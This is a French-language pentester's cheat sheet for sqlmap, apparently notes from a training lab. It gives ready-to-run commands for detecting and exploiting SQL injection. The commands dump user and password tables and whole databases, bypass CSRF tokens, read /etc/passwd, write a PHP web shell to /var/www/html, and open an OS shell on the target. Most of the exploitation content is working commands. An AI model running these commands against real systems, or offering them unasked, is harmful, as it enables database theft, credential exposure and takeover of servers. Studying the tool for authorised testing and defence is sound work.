---
title: "SQLMAp"
date: 2025-05-07T15:00:00+02:00
draft: false
tags: ["Outils", "Pentester"]
categories: ["Outils"]
summary: "SQLMAp"
showToc: true
tocOpen: true
---
## Apercu de SQLMAP

SQLMap est un outil de test d'intrusion (penetration testing) gratuit et open-source écrit en Python qui automatise le processus de détection et d'exploitation des failles d'injection SQL (SQLi). 


**Utiliser le fichier avec sqlmap** :

```
sqlmap -r requete.txt --dump --batch
```

**`--dump`** : c'est l'option qui **extrait (exfiltre) le contenu** des données. Une fois que sqlmap a confirmé une injection SQL, `--dump` récupère et affiche les lignes de la base — typiquement le contenu d'une table (utilisateurs, mots de passe, etc.)
**`--batch`** : ça dit à sqlmap de **ne jamais te poser de question** et de prendre à chaque fois la réponse par défaut.


Exécuter SQLMap sur une requête HTTP

SQLMap dispose de nombreuses options et commutateurs qui peuvent être utilisés pour configurer correctement la requête (HTTP) avant son utilisation.

'un des moyens les plus simples et les plus efficaces de configurer correctement une requête SQLMap pour une cible spécifique (c'est-à-dire une requête web avec des paramètres) est d'utiliser la fonctionnalité Copier comme cURL du panneau Réseau (Moniteur) dans les Outils de développement de Chrome, Edge ou Firefox :


```
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

Requêtes GET/POST

```
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'

sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

Requêtes HTTP complètes

ous pouvons soit copier manuellement la requête HTTP depuis Burp et l'écrire dans un fichier, soit faire un clic droit sur la requête dans Burp et choisir Copier dans un fichier. Une autre façon de capturer la requête HTTP complète serait d'utiliser le navigateur, comme mentionné précédemment dans cette section, et de choisir l'option Copier > Copier les en-têtes de la demande.

```
sqlmap -r req.txt

## cookie 

sqlmap -u "http://154.57.164.73:30367/case3.php" --cookie="id=1" --level 2 --batch -p id
```

## Gérer les erreurs de SQLMap

Nous pouvons rencontrer de nombreux problèmes lors de la configuration de SQLMap ou de son utilisation avec des requêtes HTTP.


### Afficher les erreurs

Nous pouvons rencontrer de nombreux problèmes lors de la configuration de SQLMap ou de son utilisation avec des requêtes HTTP.
La première étape consiste généralement à utiliser l'option --parse-errors, pour analyser les erreurs du SGBD (Système de Gestion de Base de Données) (s'il y en a) et les afficher dans le cadre de l'exécution du programme :

Stocker le trafic

```
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

Utilisation d'un proxy

Enfin, nous pouvons utiliser l'option --proxy pour rediriger tout le trafic via un proxy (MiTM) (par exemple, Burp). Cela acheminera tout le trafic de SQLMap via Burp, afin que nous puissions ensuite examiner manuellement toutes les requêtes

Préfixe/Suffixe
Dans de rares cas, non couverts par une exécution standard de SQLMap, des valeurs de préfixe et de suffixe spéciales sont nécessaires. Pour de telles exécutions, les options --prefix et --suffix peuvent être utilisées

```
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

Exemple 

sqlmap -r req.txt --batch --level 5 --risk 3 --prefix='`)' --dbs 
```

Niveau/Risque

Par défaut, SQLMap combine un ensemble prédéfini des délimiteurs les plus courants (c'est-à-dire des paires préfixe/suffixe), ainsi que les vecteurs ayant une forte probabilité de succès en cas de cible vulnérable.


Pour de telles exigences, les options --level et --risk doivent être utilisées :

L'option --level (1-5, par défaut 1) étend à la fois les vecteurs et les délimiteurs utilisés, en fonction de leur probabilité de succès (c'est-à-dire, plus la probabilité est faible, plus le niveau est élevé).
L'option --risk (1-3, par défaut 1) étend l'ensemble des vecteurs utilisés en fonction de leur risque de causer des problèmes côté cible (c'est-à-dire, risque de perte d'entrées dans la base de données ou de déni de service (denial-of-service)).

```
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

Quant au nombre de charges utiles, par défaut (c'est-à-dire --level=1 --risk=1), le nombre de charges utiles utilisées pour tester un seul paramètre peut aller jusqu'à 72, tandis que dans le cas le plus détaillé (--level=5 --risk=3), le nombre de charges utiles passe à 7 865.

```
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```


```
sqlmap -r req.txt --batch --technique=U --union-cols=5 --hex --dbs
```

## Énumération de la base de données

L'énumération représente la partie centrale d'une attaque par injection SQL (SQL injection), qui est effectuée juste après la détection réussie et la confirmation de l'exploitabilité de la vulnérabilité SQLi ciblée

#### Énumération des données de base de la BDD


L'énumération commence généralement par la récupération des informations de base :

- La bannière de version de la base de données (option --banner)
- Le nom de l'utilisateur actuel (option --current-user)
- Le nom de la base de données actuelle (option --current-db)
- La vérification si l'utilisateur actuel a les droits DBA (administrateur) (option --is-dba)

```
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

#### Énumération des tables

en spécifiant le nom de la table avec -T users

```
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

#### Énumération des tables/lignes

ous pouvons spécifier les colonnes (par exemple, uniquement les colonnes name et surname) avec l'option -C


Pour limiter les lignes en fonction de leur(s) numéro(s) d'ordre dans la table, nous pouvons spécifier les lignes avec les options --start et --stop (par exemple, commencer à la 2e entrée et s'arrêter à la 3e),

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

#### Énumération conditionnelle

S'il est nécessaire de récupérer certaines lignes sur la base d'une condition WHERE connue (par exemple name LIKE 'f%'), nous pouvons utiliser l'option --where,

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

#### Énumération complète de la BDD

Au lieu de récupérer le contenu table par table, nous pouvons récupérer toutes les tables de la base de données qui nous intéresse en omettant complètement l'utilisation de l'option -T (par exemple, --dump -D testdb). En utilisant simplement l'option --dump sans spécifier de table avec -T, tout le contenu de la base de données actuelle sera récupéré. Quant à l'option --dump-all, elle permet de récupérer tout le contenu de toutes les bases de données.

Dans de tels cas, il est également conseillé à l'utilisateur d'inclure l'option --exclude-sysdbs (par exemple, --dump-all --exclude-sysdbs), qui demandera à SQLMap d'ignorer la récupération du contenu des bases de données système, car celles-ci présentent généralement peu d'intérêt pour les pentesters.

####  Énumération du Schéma de la BDD

Si nous voulions récupérer la structure de toutes les tables afin d'avoir une vue d'ensemble complète de l'architecture de la base de données, nous pourrions utiliser l'option --schema 

```
sqlmap -u "http://www.example.com/?id=1" --schema
```

#### Recherche de Données

```
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

#### Énumération et Craquage de Mots de Passe

Une fois que nous avons identifié une table contenant des mots de passe (par ex. master.users), nous pouvons récupérer cette table avec l'option -T

### Contournement des protections des applications web

Dans un scénario idéal, aucune protection ne sera déployée du côté de la cible, ce qui n'empêchera pas une exploitation automatique. 

```
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```



```
sqlmap -r req.txt --batch --randomize=uid --dbs
```

### Exploitation de l'OS

SQLMap a la capacité d'utiliser une injection SQL (SQL Injection) pour lire et écrire des fichiers depuis le système local en dehors du SGBD.

####  Vérification des privilèges DBA

```
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

lecture des fichiers locaux

```
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

Ecriture 

```
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
Exécution de commandes 

```
sqlmap -u "http://www.example.com/?id=1" --os-shell
```